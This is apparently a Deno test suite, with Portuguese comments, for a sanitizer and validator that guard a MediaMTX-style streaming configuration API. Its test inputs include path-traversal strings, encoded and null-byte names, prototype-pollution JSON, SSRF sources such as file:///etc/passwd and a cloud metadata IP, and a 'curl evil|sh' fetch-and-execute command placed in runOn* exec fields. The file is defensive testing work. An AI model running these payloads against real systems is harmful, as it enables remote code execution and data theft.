import { assert, assertEquals } from 'https://deno.land/std@0.224.0/assert/mod.ts';
import { sanitizePathName, urlEscapesPrefix, validatePathBody } from './mediamtxPath.ts';

// ─── Sanitizador: nomes legítimos passam ─────────────────────────────────────
Deno.test('sanitize: aceita nomes legítimos', () => {
  for (const s of [
    'cam-entrada',
    'cam.frontdoor',
    'live/stream1',
    'portaria/cam-01',
    'a',
    'A9',
    'x'.repeat(128),
  ]) {
    assertEquals(sanitizePathName(s).ok, true, `deveria aceitar: ${s}`);
  }
});

// ─── Sanitizador: traversal é rejeitado ──────────────────────────────────────
Deno.test('sanitize: rejeita path traversal', () => {
  for (const s of [
    '../etc/passwd',
    '..',
    '../../v3/config/global/set',
    'live/../../../etc',
    'a/../b',
    'foo/../bar',
    '/..',
    '..;/',
  ]) {
    assertEquals(sanitizePathName(s).ok, false, `deveria rejeitar: ${s}`);
  }
});

// ─── Sanitizador: encoding/ctrl/slash rejeitados ─────────────────────────────
Deno.test('sanitize: rejeita encoding, controle, barras de borda', () => {
  for (const s of [
    '%2e%2e%2f',
    'cam%2fevil',
    'cam\x00',
    'cam evil',
    'café',
    '/etc/passwd',
    'live/',
    '//live',
    'a///b',
    '\\win',
    '',
  ]) {
    assertEquals(sanitizePathName(s).ok, false, `deveria rejeitar: ${JSON.stringify(s)}`);
  }
});

// ─── INVARIANTE DE SEGURANÇA: aceito ⇒ nunca escapa a URL ─────────────────────
Deno.test('sanitize: INVARIANTE — todo nome aceito é seguro na URL (fuzz)', () => {
  const chars = 'abcABC012_.-/\\ \t\n%~;:?#&$'.split('');
  const rand = (n: number) =>
    Array.from({ length: n }, () => chars[(Math.random() * chars.length) | 0]).join('');
  let violations = 0;
  for (let i = 0; i < 30000; i++) {
    const s = rand(1 + ((Math.random() * 18) | 0));
    const r = sanitizePathName(s);
    if (r.ok && urlEscapesPrefix(s)) violations++;
  }
  assertEquals(violations, 0, 'nenhum nome aceito pode escapar do prefixo da URL');
});

// ─── Validador de body: allowlist e anti-RCE ─────────────────────────────────
Deno.test('body: aceita campos declarativos seguros', () => {
  assertEquals(validatePathBody({ source: 'rtsp://x/y', sourceOnDemand: true }).ok, true);
  assertEquals(validatePathBody({ record: true, maxReaders: 10 }).ok, true);
});

Deno.test('body: rejeita TODA a família runOn* (anti-RCE)', () => {
  for (const f of [
    'runOnInit',
    'runOnDemand',
    'runOnReady',
    'runOnRead',
    'runOnRecordSegmentComplete',
    'RunOnReady',
    'runonready',
  ]) {
    const b: Record<string, unknown> = {};
    b[f] = 'curl evil|sh';
    assertEquals(validatePathBody(b).ok, false, `deveria rejeitar campo exec: ${f}`);
  }
});

Deno.test('body: rejeita prototype pollution via JSON.parse', () => {
  assertEquals(validatePathBody(JSON.parse('{"__proto__":{"polluted":true}}')).ok, false);
  assertEquals(validatePathBody(JSON.parse('{"constructor":{"x":1}}')).ok, false);
  // Object.prototype permanece intacto
  assert(({} as Record<string, unknown>).polluted === undefined);
});

Deno.test('body: rejeita SSRF (file:// e metadata) e não-objetos', () => {
  assertEquals(validatePathBody({ source: 'file:///etc/passwd' }).ok, false);
  assertEquals(validatePathBody({ source: 'rtsp://169.254.169.254/x' }).ok, false);
  for (const b of ['str', 123, true, null, [1, 2]]) {
    assertEquals(validatePathBody(b).ok, false);
  }
});
